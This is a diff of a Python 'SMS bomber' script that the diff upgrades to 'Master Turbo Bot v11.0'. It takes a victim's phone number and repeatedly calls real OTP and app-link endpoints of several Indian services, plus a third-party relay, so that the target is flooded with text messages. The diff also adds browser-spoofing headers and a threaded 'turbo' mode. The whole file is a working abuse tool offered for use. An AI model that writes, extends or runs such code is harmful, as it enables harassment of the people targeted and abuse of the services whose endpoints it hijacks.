@@ -1,112 +1,131 @@
 import requests
 import os
-import json
 import time
+import threading
 
-# --- COLOR CODES ---
-GREEN = "\033[92m"
-RED = "\033[91m"
-RESET = "\033[0m"
+# --- COLORS ---
+G = "\033[92m" # Green
+R = "\033[91m" # Red
+Y = "\033[93m" # Yellow
+W = "\033[0m"  # White
 
-# --- API DATABASE ---
-# Jo JSON aapne diya tha, uske kuch working examples yahan hain
-# Aap is list mein aur bhi APIs add kar sakte hain
+# --- GLOBAL COUNTERS ---
+success_count = 0
+failed_count = 0
+
+# ---------------------------------------------------------
+# API DATABASE (User Provided + Special Lemon Logics)
+# ---------------------------------------------------------
 SMS_APIS = [
-    {
-        "name": "justdial",
-        "method": "GET",
-        "url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php",
-        "params": {"mobile": "{target}"}
-    },
-    {
-        "name": "confirmtkt",
-        "method": "GET",
-        "url": "https://securedapi.confirmtkt.com/api/platform/register",
-        "params": {"newOtp": "true", "mobileNumber": "{target}"}
-    },
-    {
-        "name": "housing",
-        "method": "POST",
-        "url": "https://login.housing.com/api/v2/send-otp",
-        "data": {"phone": "{target}"}
-    },
-    {
-        "name": "frotels",
-        "method": "POST",
-        "url": "https://www.frotels.com/appsendsms.php",
-        "data": {"mobno": "{target}"}
-    },
-    {
-        "name": "unacademy",
-        "method": "POST",
-        "url": "https://unacademy.com/api/v1/user/get_app_link/",
-        "data": {"phone": "{target}"}
-    }
+    {"name": "JustDial", "method": "GET", "url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php", "params": {"mobile": "{target}"}},
+    {"name": "Housing.com", "method": "POST", "url": "https://login.housing.com/api/v2/send-otp", "json": {"phone": "{target}"}},
+    {"name": "ConfirmTkt", "method": "GET", "url": "https://securedapi.confirmtkt.com/api/platform/register", "params": {"newOtp": "true", "mobileNumber": "{target}"}},
+    {"name": "Porter", "method": "POST", "url": "https://porter.in/restservice/send_app_link_sms", "json": {"phone": "{target}", "brand": "porter"}},
+    {"name": "Unacademy", "method": "POST", "url": "https://unacademy.com/api/v1/user/get_app_link/", "json": {"phone": "{target}"}},
+    {"name": "Cityflo", "method": "POST", "url": "https://cityflo.com/website-app-download-link-sms/", "data": {"mobile_number": "{target}"}},
+    {"name": "3Via", "method": "POST", "url": "https://3via.ly/api/client/login", "json": {"msisdn": "{target}", "device_type": "web"}},
+    
+    # Special Lemon Logics (GET, POST Query, POST Payload)
+    {"name": "Lemon-V1", "method": "GET", "url": "https://sms-api-lemon.vercel.app/api/src", "params": {"number": "{target}"}},
+    {"name": "Lemon-V2", "method": "POST", "url": "https://sms-api-lemon.vercel.app/api/src?number={target}", "data": {}},
+    {"name": "Lemon-V3", "method": "POST", "url": "https://sms-api-lemon.vercel.app/api/src?number=", "json": {
+        "Version": "V1", "Language": "en", "Platform": "web", "ProductId": 1733,
+        "MobileNo": "{target}", "OperatorId": "100007", "source": "organic"
+    }}
 ]
 
-def clear_screen():
+def clear():
     os.system("clear")
 
-def main():
-    clear_screen()
-    print(f"{GREEN}========================================")
-    print("      🚀 API TURBO BOMBER v9.0         ")
-    print(f"========================================{RESET}\n")
+def banner():
+    print(f"{G}========================================")
+    print("      🚀 MASTER TURBO BOT v11.0        ")
+    print(f"========================================{W}\n")
 
-    # Wahi purana feature: Target Number mangna
-    target = input("Enter Target Number: ")
+# --- CORE REQUEST FUNCTION ---
+def send_request(api, target):
+    global success_count, failed_count
+    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"}
     
-    # Mode selection
-    print("\nSelect Mode:")
-    print("1. SMS Mode (API Fast)")
-    print("2. Call Mode (Coming Soon)")
-    choice = input("\nChoice: ")
-
-    if choice != "1":
-        print("Abhi sirf SMS Mode ready hai!"); return
-
-    limit = input("How many SMS to send? (e.g. 50): ")
-    
-    print(f"\n{GREEN}[*] Starting API Attack on {target}...{RESET}")
-    print("[*] Press CTRL+C to stop.\n")
-
-    count = 0
     try:
-        while count < int(limit):
+        url = api["url"].replace("{target}", target)
+        
+        params = {k: v.replace("{target}", target) if isinstance(v, str) else v for k, v in api.get("params", {}).items()} if "params" in api else None
+        json_p = {k: v.replace("{target}", target) if isinstance(v, str) else v for k, v in api.get("json", {}).items()} if "json" in api else None
+        data_p = {k: v.replace("{target}", target) if isinstance(v, str) else v for k, v in api.get("data", {}).items()} if "data" in api else None
+
+        if api["method"] == "GET":
+            response = requests.get(url, params=params, headers=headers, timeout=5)
+        else:
+            response = requests.post(url, json=json_p, data=data_p, headers=headers, timeout=5)
+
+        if response.status_code == 200:
+            success_count += 1
+            print(f"{G}[SUCCESS] {api['name']} sent successfully!{W}")
+        else:
+            failed_count += 1
+            print(f"{Y}[-] {api['name']} status: {response.status_code}{W}")
+
+    except Exception:
+        failed_count += 1
+        print(f"{R}[!] Failed via {api['name']}{W}")
+
+# --- MAIN LOOP ---
+def main():
+    clear()
+    banner()
+    
+    target = input(f"{G}Enter Target Number: {W}")
+    limit = input(f"{G}Enter SMS Limit: {W}")
+    
+    print(f"\n{Y}Select Mode:")
+    print("1. Serial Mode (Safe & Stable)")
+    print(f"2. Threading Mode (Turbo Speed - May Lag){W}")
+    mode = input("\nChoice: ")
+
+    if not target or not limit:
+        print(f"{R}Galti: Target ya Limit empty hai!{W}"); return
+
+    limit = int(limit)
+    current_sent = 0
+
+    print(f"\n{G}[*] Launching Attack on {target}...{W}\n")
+
+    if mode == "1":
+        # Serial Mode
+        while current_sent < limit:
             for api in SMS_APIS:
-                if count >= int(limit): break
-                
-                try:
-                    # Target number ko JSON ki jagah fit karna
-                    url = api["url"]
-                    
-                    headers = {
-                        "User-Agent": "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
-                        "Referer": "https://google.com"
-                    }
+                if current_sent >= limit: break
+                send_request(api, target)
+                current_sent += 1
+                time.sleep(0.5)
+    else:
+        # Threading Mode
+        threads = []
+        while current_sent < limit:
+            for api in SMS_APIS:
+                if current_sent >= limit: break
+                t = threading.Thread(target=send_request, args=(api, target))
+                t.start()
+                threads.append(t)
+                current_sent += 1
+                time.sleep(0.1) # Thread gap
+            
+            for t in threads:
+                t.join()
 
-                    if api["method"] == "GET":
-                        # Params mein target number dalna
-                        params = {k: v.replace("{target}", target) for k, v in api.get("params", {}).items()}
-                        response = requests.get(url, params=params, headers=headers, timeout=5)
-                    
-                    else:
-                        # POST data mein target number dalna
-                        data = {k: v.replace("{target}", target) for k, v in api.get("data", {}).items()}
-                        response = requests.post(url, data=data, headers=headers, timeout=5)
-
-                    count += 1
-                    print(f"{GREEN}[{count}] Sent via {api['name']} | Status: {response.status_code}{RESET}")
-                    time.sleep(0.5) # Fast speed but safe gap
-
-                except Exception:
-                    print(f"{RED}[!] Failed via {api['name']}{RESET}")
-                    continue
-
-    except KeyboardInterrupt:
-        print(f"\n{RED}[!] Stopped by user.{RESET}")
-
-    print(f"\n{GREEN}--- ATTACK FINISHED: {count} Sent ---{RESET}")
+    # --- FINAL DASHBOARD ---
+    print(f"\n{G}========================================")
+    print(f"           FINAL DASHBOARD")
+    print(f"========================================")
+    print(f"Target Number : {target}")
+    print(f"Total Sent    : {current_sent}")
+    print(f"Success       : {success_count}")
+    print(f"Failed        : {failed_count}")
+    print(f"========================================{W}")
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"\n{R}[!] Stopped by user.{W}")
